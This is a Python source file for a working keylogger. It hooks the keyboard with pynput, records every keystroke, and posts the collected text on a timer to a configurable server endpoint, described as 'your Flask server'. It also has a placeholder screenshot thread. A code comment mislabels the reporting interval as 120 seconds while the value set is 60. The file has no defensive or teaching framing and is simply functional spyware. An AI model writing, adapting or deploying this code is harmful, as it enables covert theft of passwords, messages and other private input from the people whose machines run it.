import requests
from pynput import keyboard
from PIL import ImageGrab
import datetime
import os
import time
import threading
import json

# Set up your server URL and interval for reporting
SERVER_URL = "http://localhost:5000/update"  # URL of your Flask server
SEND_REPORT_EVERY = 60  # Report every 120 seconds

class KeyLogger:
    def __init__(self, time_interval, server_url):
        self.interval = time_interval
        self.log = ""
        self.server_url = server_url

    def append_log(self, string):
        self.log = self.log + string   

    def send_data(self):
        if self.log:
            data = {
                'date': datetime.datetime.now().strftime('%Y-%m-%d'),
                'time': datetime.datetime.now().strftime('%H:%M:%S'),
                'logs': self.log
            }
            requests.post(self.server_url, json=data)
            self.log = ""

    def on_press(self, key):
        if key == keyboard.Key.backspace or key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r or key == keyboard.Key.alt_l or key == keyboard.Key.alt_r or key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
           return
        try:
            key_str = key.char
        except AttributeError:
            if key == key.space:
                key_str = " "
            elif key == key.enter:
                key_str = "\n"
            else:
                key_str = f" [{str(key)}] "

        self.append_log(key_str)

    def capture_screenshots(self):
        while True:
            # Add logic to capture screenshots and send them to the server if needed
            time.sleep(10)  # Wait before capturing the next screenshot

    def report(self):
        self.send_data()
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        screenshot_thread = threading.Thread(target=self.capture_screenshots)
        screenshot_thread.daemon = True
        screenshot_thread.start()

        with keyboard.Listener(on_press=self.on_press) as listener:
            self.report()  # Start the reporting loop
            listener.join()

if __name__ == '__main__':
    keylogger = KeyLogger(SEND_REPORT_EVERY, SERVER_URL)
    keylogger.start()
